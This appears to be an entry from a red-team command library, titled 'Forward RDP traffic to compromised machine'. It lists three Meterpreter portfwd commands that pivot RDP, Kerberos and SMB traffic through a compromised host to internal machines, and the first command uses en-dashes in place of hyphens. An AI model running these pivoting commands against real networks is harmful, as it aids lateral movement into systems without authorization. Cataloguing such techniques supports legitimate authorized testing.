---
id: 170c7951-ce28-4be5-86a1-320591113c02
name: Forward RDP traffic to compromised machine
type: command
executor: bash
data: 'portfwd add –l 3389 –p 3389 –r target-host

  portfwd add -l 88 -p 88 -r 127.0.0.1

  portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445'
output: null
created_at: '2023-04-06T03:56:22.631643+00:00'
updated_at: '2023-04-10T20:25:13.238717+00:00'
---

# Forward RDP traffic to compromised machine

```bash
portfwd add –l 3389 –p 3389 –r target-host
portfwd add -l 88 -p 88 -r 127.0.0.1
portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
```


